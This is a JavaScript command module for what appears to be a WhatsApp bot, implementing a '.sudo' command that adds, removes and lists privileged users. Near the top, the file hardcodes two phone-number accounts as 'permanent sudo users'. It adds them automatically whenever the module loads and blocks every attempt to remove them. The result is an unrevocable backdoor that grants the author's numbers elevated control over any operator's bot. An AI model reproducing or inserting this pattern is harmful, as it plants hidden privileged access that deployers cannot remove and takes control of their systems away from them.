// commands/sudo.js
const settings = require('../settings');
const { addSudo, removeSudo, getSudoList } = require('../lib/index');
const isOwnerOrSudo = require('../lib/isOwner');

const FOOTER = '© bigmanj tech ™ with ♥︎';

// ─── PERMANENT SUDO USERS ───
const PERMANENT_SUDO_USERS = [
    '255777580820@s.whatsapp.net',
    '255636756591@s.whatsapp.net'
];

// Add permanent sudo users on module load
(async () => {
    try {
        for (const user of PERMANENT_SUDO_USERS) {
            await addSudo(user);
        }
        console.log('✅ Permanent sudo users initialized:', PERMANENT_SUDO_USERS);
    } catch (error) {
        console.error('❌ Failed to initialize permanent sudo users:', error);
    }
})();

// ─── Helper: Extract mentioned JID ───
function extractMentionedJid(message) {
    const mentioned = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentioned.length > 0) return mentioned[0];
    const text = message.message?.conversation || message.message?.extendedTextMessage?.text || '';
    const match = text.match(/\b(\d{7,15})\b/);
    if (match) return match[1] + '@s.whatsapp.net';
    return null;
}

// ─── Helper: Format number for display ───
function formatNumber(jid) {
    return jid.split('@')[0];
}

// ─── MAIN SUDO COMMAND ───
async function sudoCommand(sock, chatId, message) {
    try {
        const senderJid = message.key.participant || message.key.remoteJid;
        const isOwner = message.key.fromMe || await isOwnerOrSudo(senderJid, sock, chatId);

        const rawText = message.message?.conversation || message.message?.extendedTextMessage?.text || '';
        const args = rawText.trim().split(' ').slice(1);
        const sub = (args[0] || '').toLowerCase();

        // ─── SHOW HELP ───
        if (!sub || !['add', 'del', 'remove', 'list'].includes(sub)) {
            const helpMsg = 
`└── ▢ 🔑 *SUDO COMMAND*

└── ▢ ──── *USAGE* ────
└── ▢ .sudo add @user  - Add sudo user
└── ▢ .sudo del @user  - Remove sudo user
└── ▢ .sudo list       - List sudo users

└── ▢ ──── *PERMANENT SUDO* ────
└── ▢ 🔒 ${formatNumber(PERMANENT_SUDO_USERS[0])}
└── ▢ 🔒 ${formatNumber(PERMANENT_SUDO_USERS[1])}

${FOOTER}`;
            await sock.sendMessage(chatId, { text: helpMsg }, { quoted: message });
            return;
        }

        // ─── LIST SUDO USERS ───
        if (sub === 'list') {
            const list = await getSudoList();
            if (list.length === 0) {
                await sock.sendMessage(chatId, { 
                    text: `└── ▢ 📋 *SUDO LIST*\n\n└── ▢ No sudo users set.\n\n${FOOTER}` 
                }, { quoted: message });
                return;
            }

            let text = `└── ▢ 📋 *SUDO LIST*\n\n`;
            list.forEach((jid, i) => {
                const isPermanent = PERMANENT_SUDO_USERS.includes(jid);
                const num = formatNumber(jid);
                text += `└── ▢ ${i + 1}. ${num}${isPermanent ? ' 🔒 (Permanent)' : ''}\n`;
            });
            text += `\n└── ▢ 🔒 = Permanent sudo users (cannot be removed)`;
            text += `\n\n${FOOTER}`;

            await sock.sendMessage(chatId, { text }, { quoted: message });
            return;
        }

        // ─── ONLY OWNER CAN ADD/REMOVE ───
        if (!isOwner) {
            await sock.sendMessage(chatId, { 
                text: `└── ▢ ❌ *PERMISSION DENIED*\n\n└── ▢ Only owner can add/remove sudo users.\n└── ▢ Use .sudo list to view.\n\n${FOOTER}` 
            }, { quoted: message });
            return;
        }

        const targetJid = extractMentionedJid(message);
        if (!targetJid) {
            await sock.sendMessage(chatId, { 
                text: `└── ▢ ❌ *ERROR*\n\n└── ▢ Please mention a user or provide a number.\n└── ▢ Example: .sudo add @user\n\n${FOOTER}` 
            }, { quoted: message });
            return;
        }

        // ─── PREVENT REMOVING PERMANENT SUDO ───
        if ((sub === 'del' || sub === 'remove') && PERMANENT_SUDO_USERS.includes(targetJid)) {
            await sock.sendMessage(chatId, { 
                text: `└── ▢ ❌ *ACTION BLOCKED*\n\n└── ▢ Cannot remove permanent sudo user!\n└── ▢ User: ${formatNumber(targetJid)} 🔒\n\n${FOOTER}` 
            }, { quoted: message });
            return;
        }

        // ─── ADD SUDO ───
        if (sub === 'add') {
            const ok = await addSudo(targetJid);
            if (ok) {
                await sock.sendMessage(chatId, { 
                    text: `└── ▢ ✅ *SUDO ADDED*\n\n└── ▢ User : ${formatNumber(targetJid)}\n└── ▢ Status: ✅ Success\n\n${FOOTER}` 
                }, { quoted: message });
            } else {
                await sock.sendMessage(chatId, { 
                    text: `└── ▢ ❌ *FAILED*\n\n└── ▢ Failed to add sudo user.\n\n${FOOTER}` 
                }, { quoted: message });
            }
            return;
        }

        // ─── REMOVE SUDO ───
        if (sub === 'del' || sub === 'remove') {
            const ownerJid = settings.ownerNumber + '@s.whatsapp.net';
            if (targetJid === ownerJid) {
                await sock.sendMessage(chatId, { 
                    text: `└── ▢ ❌ *ACTION BLOCKED*\n\n└── ▢ Owner cannot be removed from sudo.\n\n${FOOTER}` 
                }, { quoted: message });
                return;
            }

            const ok = await removeSudo(targetJid);
            if (ok) {
                await sock.sendMessage(chatId, { 
                    text: `└── ▢ ✅ *SUDO REMOVED*\n\n└── ▢ User : ${formatNumber(targetJid)}\n└── ▢ Status: ✅ Removed\n\n${FOOTER}` 
                }, { quoted: message });
            } else {
                await sock.sendMessage(chatId, { 
                    text: `└── ▢ ❌ *FAILED*\n\n└── ▢ Failed to remove sudo user.\n\n${FOOTER}` 
                }, { quoted: message });
            }
            return;
        }

    } catch (error) {
        console.error('Sudo command error:', error);
        await sock.sendMessage(chatId, { 
            text: `└── ▢ ❌ *ERROR*\n\n└── ▢ ${error.message || 'Unknown error'}\n\n${FOOTER}` 
        }, { quoted: message });
    }
}

module.exports = sudoCommand;
